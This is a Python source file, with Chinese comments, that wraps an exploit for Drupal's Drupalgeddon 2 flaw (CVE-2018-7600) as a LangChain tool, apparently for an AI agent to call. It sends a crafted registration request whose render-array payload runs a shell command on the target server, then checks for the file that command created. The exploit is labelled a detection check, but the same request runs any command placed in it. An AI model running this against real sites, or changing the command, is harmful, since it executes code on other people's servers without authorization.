# -*- coding:utf-8 -*-
"""
Drupal漏洞POC验证工具
使用@tool装饰器封装backend.poc.drupal模块
"""

from langchain.tools import tool
from typing import Dict, Any


@tool
def drupal_cve_2018_7600(target: str, timeout: int = 10) -> Dict[str, Any]:
    """Drupal CVE-2018-7600 远程代码执行漏洞检测工具
    
    检测目标是否存在Drupalgeddon 2远程代码执行漏洞(CVE-2018-7600)。
    该漏洞存在于Drupal Core的用户注册表单中，攻击者可以通过构造恶意的
    注册请求来执行任意PHP代码。
    
    影响版本:
    - Drupal 6.x, 7.x, 8.x, 9.x
    
    检测原理:
    通过向/user/register端点发送包含恶意PHP代码的注册请求，
    尝试创建一个包含测试内容的文件。如果能够成功访问该文件，
    则说明存在漏洞。
    
    Args:
        target: 目标URL，如 http://example.com/
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        import requests
        
        target_url = target.rstrip('/')
        commands = 'echo "test:)" | tee index1.txt'
        url = target_url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': commands
        }
        
        requests.post(url=url, data=payload, timeout=timeout)
        index1_url = target_url + '/index1.txt'
        res = requests.get(url=index1_url, timeout=timeout)
        
        if 'test:)' in res.text and res.status_code == 200:
            return {
                "success": True,
                "data": {
                    "vulnerable": True,
                    "cve_id": "CVE-2018-7600",
                    "vulnerability": "Drupalgeddon 2 Remote Code Execution",
                    "target": target_url
                },
                "error": None,
                "metadata": {
                    "tool": "drupal_cve_2018_7600",
                    "target": target,
                    "cve_id": "CVE-2018-7600",
                    "severity": "critical"
                }
            }
        else:
            return {
                "success": True,
                "data": {
                    "vulnerable": False,
                    "cve_id": "CVE-2018-7600",
                    "target": target_url
                },
                "error": None,
                "metadata": {
                    "tool": "drupal_cve_2018_7600",
                    "target": target,
                    "cve_id": "CVE-2018-7600"
                }
            }
    except ImportError as e:
        return {
            "success": False,
            "data": None,
            "error": f"导入requests模块失败: {str(e)}",
            "metadata": {"tool": "drupal_cve_2018_7600", "target": target}
        }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行drupal_cve_2018_7600工具异常: {str(e)}",
            "metadata": {"tool": "drupal_cve_2018_7600", "target": target}
        }


if __name__ == "__main__":
    test_result = drupal_cve_2018_7600.invoke("http://example.com/")
    print(test_result)
